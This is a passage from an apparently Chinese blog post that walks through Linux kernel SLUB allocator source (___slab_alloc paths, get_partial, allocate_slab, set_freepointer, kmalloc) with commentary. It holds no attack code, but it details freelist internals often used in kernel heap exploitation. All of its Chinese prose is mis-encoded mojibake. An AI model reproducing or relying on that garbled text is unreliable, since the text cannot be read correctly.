flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab ä¸ä¸ºç©ºï¼Œç›´æ¥è·³å› redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//è¢«æŠ¢å ç„¶åpartialç©ºäº†</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* æˆ‘ä»¬è¢«æŠ¢å äº†ä¸” partial é“¾è¡¨ç©ºäº† */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// è·å–ä¸€å¼  percpu patial slabï¼Œè·³å› redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¤-new-objectsï¼šè·å–-node-pertial-slab-æˆ–å‘-buddy-è¯·æ±‚æ–°-slab-è¿›è¡Œåˆ†é…"><a href="#â‘¤-new-objectsï¼šè·å–-node-pertial-slab-æˆ–å‘-buddy-è¯·æ±‚æ–°-slab-è¿›è¡Œåˆ†é…" class="headerlink" title="â‘¤ new_objectsï¼šè·å– node pertial slab æˆ–å‘ buddy è¯·æ±‚æ–° slab è¿›è¡Œåˆ†é…"></a>â‘¤ new_objectsï¼šè·å– node pertial slab æˆ–å‘ buddy è¯·æ±‚æ–° slab è¿›è¡Œåˆ†é…</h4><p>è‹¥ percpu partial é“¾è¡¨ä¹Ÿä¸ºç©ºï¼Œé‚£ä¹ˆä¾¿æ¥åˆ°æ¥ä¸‹æ¥çš„ <code>new_objects</code> æ ‡ç­¾åˆ†é…ä¸€ä¸ªæ–°çš„ slabï¼Œé¦–å…ˆä¼šè®¾ç½® <code>partial_context</code>ï¼Œè°ƒç”¨ <code>get_partial()</code> å°è¯•ä» <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é…ä¸€ä¸ª slabï¼Œè‹¥åˆ†é…æˆåŠŸåˆ™ç›´æ¥è·³è½¬åˆ° <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> é¦–å…ˆä¼šè°ƒç”¨ <code>get_partial_node()</code> ä»å½“å‰ node çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨åˆ†é… slabï¼Œè‹¥æˆåŠŸäº†åˆ™ç›´æ¥è¿”å›ï¼Œå¦‚æœå¤±è´¥äº†ä½†æ˜¯æŒ‡å®šäº†åˆ†é…çš„ node ä¸º <code>NUMA_NO_NODE</code>ï¼Œåˆ™è°ƒç”¨ <code>get_any_partial()</code> ä»å…¶ä»–çš„ <code>kmem_cache_node</code> çš„ partial é“¾è¡¨å°è¯•åˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è·å–ä¸€ä¸ª partial slab, åŠ é”å¹¶è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// ä»å½“å‰ node çš„ partial é“¾è¡¨åˆ†é… slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// ä»å…¶ä»– node çš„ partial é“¾è¡¨åˆ†é… slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥ <code>get_partial()</code> æ²¡æ³•è·å–åˆ° slabï¼Œåˆ™è°ƒç”¨ <code>new_slab()</code> å‘ buddy system è¯·æ±‚ä¸€ä»½æ–°çš„ slabï¼Œè‹¥å¤±è´¥äº†åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>allocate_slab()</code>ï¼š</p><ul><li>é¦–å…ˆæ£€æŸ¥é¡µé¢åˆ†é…æ ‡å¿—ä½ï¼Œä¹‹åè°ƒç”¨ <code>alloc_slab_page()</code> åœ¨æŒ‡å®š node ä¸Šè¿›è¡Œåˆ†é…<ul><li>è‹¥ <code>node == NUMA_NO_NODE</code>ï¼Œåˆ™è¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>alloc_pages()</code>ï¼Œå¦åˆ™ä¼šè°ƒç”¨ <code>__alloc_pages_node()</code></li></ul></li><li>è‹¥å¤±è´¥äº†åˆ™å†æ¬¡è°ƒç”¨  <code>alloc_slab_page()</code>  å°è¯•è¿›è¡Œæœ€å°å†…å­˜åˆ†é…ï¼ˆ<code>kmem_cache-&gt;min</code>ï¼‰ï¼Œä»å¤±è´¥åˆ™ç›´æ¥è¿”å› NULL</li><li>åˆå§‹åŒ– slab å„æˆå‘˜ï¼Œå¹¶è°ƒç”¨ <code>shuffle_freelist()</code> ä¸ºç©ºé—²å¯¹è±¡æ„é€ éšæœºåŒ–é“¾è¡¨ï¼Œè‹¥æœªå¼€å¯éšæœºåŒ–åˆ™å°†ç©ºé—²å¯¹è±¡æŒ‰é¡ºåºè¿æ¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è®©æœ€åˆçš„ higher-order åˆ†é…åœ¨å†…å­˜å‹åŠ›ä¸‹å¤±è´¥</span><br><span class="hljs-comment"> * ç”±æ­¤æˆ‘ä»¬è¿”å›åˆ°æœ€å° order çš„åˆ†é….</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//åˆ†é…å¤±è´¥ï¼Œå°è¯•æœ€å°å†…å­˜åˆ†é…</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åˆ†é…å¯èƒ½å› ä¸ºç¢ç‰‡åŒ–è€Œå¤±è´¥.</span><br><span class="hljs-comment"> * å¯èƒ½çš„è¯å°è¯•ä¸€ä¸ª lower order çš„åˆ†é…</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//å¼€å¯äº†éšæœºåŒ–ä¼šåœ¨è¯¥å‡½æ•°å†…éšæœºè¿æ¥</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//æœªå¼€å¯éšæœºåŒ–ï¼ŒæŒ‰é¡ºåºè¿æ¥</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†ä¸€ä¸ªå‡½æ•° <code>set_freepointer()</code>ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>freelist_ptr()</code> å‘ <code>object + s-&gt;offset</code> çš„ä½ç½®å†™å…¥ç”¨ <code>freelist_ptr()</code> åŠ å¯†åçš„ <code>fp</code> æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿”å› <code>___slab_alloc()</code>ï¼Œå¦‚æœ<strong>è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½</strong>ï¼Œåˆ™æ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>alloc_single_from_new_slab()</code> <strong>ä»æ–°è·å–åˆ°çš„ slab ä¸Šåˆ†é…ä¸€ä¸ªå¯¹è±¡åå°† slab é‡æ–°æŒ‚å› partial&#x2F;full é“¾è¡¨</strong>ï¼Œè‹¥åˆ†é…å¤±è´¥åˆ™è·³è½¬å› <code>new_objects</code>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰è®¾ç½® <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œåˆ™æ¥ä¸‹æ¥è·å– slab çš„ freelistï¼Œå¹¶è°ƒç”¨ <code>inc_slabs_node()</code> å¢åŠ  node ä¸Šçš„è®¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="â‘¥-check-new-slabï¼šæ£€æŸ¥-slab"><a href="#â‘¥-check-new-slabï¼šæ£€æŸ¥-slab" class="headerlink" title="â‘¥ check_new_slabï¼šæ£€æŸ¥ slab"></a>â‘¥ check_new_slabï¼šæ£€æŸ¥ slab</h4><p>æ¥ä¸‹æ¥å¯¹æ–°è·å–çš„ slab è¿›è¡Œæ£€æŸ¥ï¼Œè‹¥è¯¥ kmem_cache è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦è®¾ç½®äº† <code>SLAB_STORE_USER</code> æ ‡å¿—ä½ï¼Œä¹‹åç›´æ¥è¿”å› freelist</p><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>pfmemalloc_match()</code> æ£€æŸ¥ slab ä¸åˆ†é…æ ‡å¿—ä½æ˜¯å¦ä¸åŒ¹é…ï¼Œè‹¥æ˜¯åˆ™è°ƒç”¨ <code>deactivate_slab()</code> ä½¿å…¶ä¸å†æ´»åŠ¨å¹¶è¿”å› freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¦-retry-load-slabï¼š"><a href="#â‘¦-retry-load-slabï¼š" class="headerlink" title="â‘¦ retry_load_slabï¼š"></a>â‘¦ retry_load_slabï¼š</h4><p>æœ€åå°±æ˜¯å°è¯•åŠ è½½æ–°è·å¾—çš„ slabï¼Œå¦‚æœ percpu slab ä¸ä¸º NULL åˆ™ä½¿å…¶ä¸å†æ´»åŠ¨ï¼Œå¹¶è®¾ç½® percpu slab &amp; freelist ä¸º NULLï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid</p><p>æœ€åå°±æ˜¯å°† percpu slab è®¾ä¸ºæ–°è·å–çš„ slab å¹¶è·³è½¬å› <code>load_freelist</code> åˆ†é…å¯¹è±¡å¹¶è¿”å›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub åˆ†é…ç®—æ³•çš„æ ¸å¿ƒé€»è¾‘åˆ†æç»“æŸ</p><h2 id="äºŒã€kmallocï¼š-NUMA-NO-NODE-çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£"><a href="#äºŒã€kmallocï¼š-NUMA-NO-NODE-çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£" class="headerlink" title="äºŒã€kmallocï¼š NUMA_NO_NODE çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£"></a>äºŒã€kmallocï¼š NUMA_NO_NODE çš„é€šç”¨ä¸Šå±‚åˆ†é…æ¥å£</h2><p>æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼ˆï¼Ÿï¼‰æœ€å¸¸ç”¨çš„å…¶å®è¿˜æ˜¯ <code>kmalloc()</code>ï¼Œå…¶ä¼šæ ¹æ®åˆ†é…çš„å¤§å°ä¸æ ‡å¿—ä½å¸®æˆ‘ä»¬å®Œæˆ <code>kmem_cache</code> çš„é€‰å–å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</p><p>å‡½æ•°æ•´ä½“é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>è‹¥åˆ†é…çš„å¤§å°åœ¨ç¼–è¯‘æœŸå·²çŸ¥ï¼ˆ<code>__builtin_constant_p()</code>ï¼‰åˆ™åˆ¤æ–­å¤§å°ï¼š<ul><li>è‹¥å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> åˆ™ä½¿ç”¨ <code>kmalloc_large()</code> è¿›è¡Œåˆ†é…</li><li>é€šè¿‡ <code>kmalloc_index()</code> ä¸ <code>kmalloc_type()</code> è·å– <code>kmalloc_caches</code> ä¸­å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡å¹¶è°ƒç”¨ <code>kmalloc_trace</code> è¿›è¡Œå¯¹è±¡åˆ†é…</li></ul></li><li>è‹¥å¤§å°æ˜¯åŠ¨æ€ä¼ å…¥çš„ï¼Œè°ƒç”¨ <code>__kmalloc()</code> è¿›è¡Œåˆ†é…</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - åˆ†é…å†…æ ¸å†…å­˜</span><br><span class="hljs-comment"> * @size: éœ€è¦çš„å†…å­˜å­—èŠ‚æ•°.</span><br><span class="hljs-comment"> * @flags: æè¿°åˆ†é…ä¸Šä¸‹æ–‡</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc æ˜¯å†…æ ¸ä¸­åˆ†é…å°äºé¡µé¢å¤§å°çš„å†…å­˜å¯¹è±¡çš„é€šç”¨æ–¹æ³•.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è¢«åˆ†é…çš„å¯¹è±¡åœ°å€è‡³å°‘è¦å¯¹é½åˆ° ARCH_KMALLOC_MINALIGN å­—èŠ‚.</span><br><span class="hljs-comment"> * å¯¹äº 2^n å­—èŠ‚çš„ @size , å¯¹é½ä¹Ÿéœ€è¦ä¿è¯è‡³å°‘åˆ°è¯¥å¤§å°.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument å¯èƒ½æ˜¯ include/linux/gfp.h ä¸­å®šä¹‰çš„GFP æ ‡å¿—ä½ï¼Œæè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ¨èçš„å¯¹ @flags ä½¿ç”¨æè¿°äº</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä»¥ä¸‹ä¸ºæœ€å¸¸ç”¨çš„ GFP æ ‡å¿—ä½ç®€è¦æ¦‚è¿°</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *åˆ†é…æ™®é€šå†…æ ¸å†…å­˜. å¯èƒ½ç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *åˆ†é…å°†ä¸ä¼šç¡çœ .  å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¹Ÿå¯ä»¥é€šè¿‡å¼‚æˆ–ä»¥ä¸‹çš„ä¸€ä¸ªæˆ–å¤šä¸ªé¢å¤–@flagsæ¥è®¾ç½®ä¸åŒçš„æ ‡å¿—ä½:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *åœ¨è¿”å›å‰æ¸…é›¶åˆ†é…çš„å†…å­˜. ä¹Ÿå¯å‚è§ kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *è¿™ä¸ªåˆ†é…æœ‰ç€é«˜ä¼˜å…ˆçº§ä¸”å¯èƒ½ä½¿ç”¨ emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *è¡¨ç¤ºæ­¤æ¬¡åˆ†é…ä¸å…è®¸å¤±è´¥</span><br><span class="hljs-comment"> *(åœ¨ä½¿ç”¨å‰å†æ¬¡æ€è€ƒ).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *è‹¥å†…å­˜ä¸ä¼šé©¬ä¸Šå¯ç”¨,ç«‹å³æ”¾å¼ƒ.</span><br><span class="hljs-comment"> 